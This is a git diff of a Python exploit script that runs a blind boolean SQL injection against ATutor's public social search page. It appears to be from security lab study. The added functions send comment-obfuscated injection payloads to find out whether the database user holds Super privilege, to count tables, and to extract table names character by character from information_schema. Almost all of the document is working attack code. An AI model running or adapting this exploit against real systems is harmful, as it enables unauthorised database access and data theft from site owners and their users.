@@ -6,14 +6,19 @@ import sys
 # sudo apt proxy install php5-xdebug is all awe need
 
 
-def searchFriends_blind(ip, sub_query):
+def searchFriends_blind(ip, sub_query, debug=False):
     injection_string_truthy = F"test')/**/or/**/(select/**/if(1=1,({sub_query}),1))%23"
     #injection_string_falsy = F"test')/**/or/**/(select/**/if(1=2,({sub_query}),1))%23"
     target = F"http://{ip}/ATutor/mods/_standard/social/index_public.php?q={injection_string_truthy}"
     #print(target)
     r = requests.get(target)
     content_length = int(r.headers['Content-Length'])
-    #print(content_length)
+    if debug == True:
+        print("content length:", content_length)
+        print ("reponse", r.content)
+
+    # in burp the content length is 246 but here it's 180, idk why
+    # the error condition response content lenght is 20 so our truth condition could be content_length > 20 but i prefer to be exact
     if (content_length == 180):
         return True
     return False
@@ -42,7 +47,52 @@ def extractCurrentUsername(ip, username_length):
                 username += chr(j)
     print("\n(+) Current DB user is: ", username)   
     print("\n(+) done")
+    return username
+def currentUserIsDbAdmin(ip, username):
+    sub_query = F"SELECT(SELECT/**/COUNT(*)/**/FROM/**/mysql.user/**/WHERE/**/Super_priv/**/='Y'/**/AND/**/current_user='{username}')>1"
+    if(searchFriends_blind(ip,sub_query, debug=False)):
+        print(F"\n(+) Current DB user {username} has Super Privilege")
+    else:
+        print(F"\n(+) Current DB user {username} does NOT have Super Privilege")
+
+def getNumberOfTables(ip, lowerbound, upperbound):
+    for i in range(lowerbound, upperbound):
+        sub_query = F"SELECT/**/(SELECT/**/COUNT(table_name)/**/FROM/**/information_schema.tables)/**/=/**/{i}"
+        if(searchFriends_blind(ip,sub_query)):
+            print("(+) Database has ", i, " tables")
+            return i
+def getTableNames(ip, num_tables):
+    print("(+) Exfiltrating tables")
+    table_names = []
+    for i in range(0, num_tables):
+        # max chars of a table name in mysql is 64,
+        # this is the way lazy and causes an excessive number of requests.
+        # The proper way would be to extract the length of each table ahead of time but,
+        # I'm not in the mood to write it so.
+        table_name = ''
+        for j in range(1, 65):
+            for k in range(32, 126):
+                sub_query=F"SELECT/**/ascii(substring((SELECT/**/table_name/**/FROM/**/information_schema.tables/**/limit/**/{i},1),{j},1))={k}"
+                if(searchFriends_blind(ip,sub_query,debug=False)):
+                    table_name += chr(k)
+        table_names.append(table_name)
+    print("(+) Exfiltrated tables", table_names)
+    return table_names
+'''
+def getNumberOfDBAdmins(ip):
     pass
+def getDbAdmins(ip, num_admins):
+    db_admins = []
+    for i in range(0, num_admins):
+        username = ''
+        for j in range(32, 126):
+            sub_query = F"select/**/ascii(substring((select/**/current_user/**/from/**/mysql.user/**/where Super_priv='Y'/**/limit 1),1,1))/**/={j}"
+            if(searchFriends_blind(ip,sub_query)):
+                username += chr(j)
+    pass
+
+'''
+'''
 # old shit
 def extractDBCurrentUserNameLengthOLD(ip):
     # mysql usernames were increased from 16 to 32 in version 8.0
@@ -94,6 +144,7 @@ def extractDBUserPrivs(ip):
         sys.stdout.write(extracted_char)
         sys.stdout.flush()
     print("\n(+) done!")
+'''
 def main():
     if len(sys.argv) != 2:
         print("(+) usage: %s <target>"  % sys.argv[0])
@@ -102,15 +153,11 @@ def main():
 
     ip = sys.argv[1]
     #extractDBVersion(ip)
-    username_length = extractCurrentUserNameLength(ip)
-    extractCurrentUsername(ip,username_length)
-
-    #extractDBCurrentUserNameLength(ip)
-    #extractDBUser(ip)
-    #extractDBUserPrivs(ip)
-
-
-
-
+    #username_length = extractCurrentUserNameLength(ip)
+    #extractCurrentUsername(ip,username_length)
+    #currentUserIsDbAdmin(ip,'root@localhost')
+    #num_tables = getNumberOfTables(ip,0,250)
+    #getTableNames(ip, num_tables)
+    
 if __name__ == "__main__":
     main()
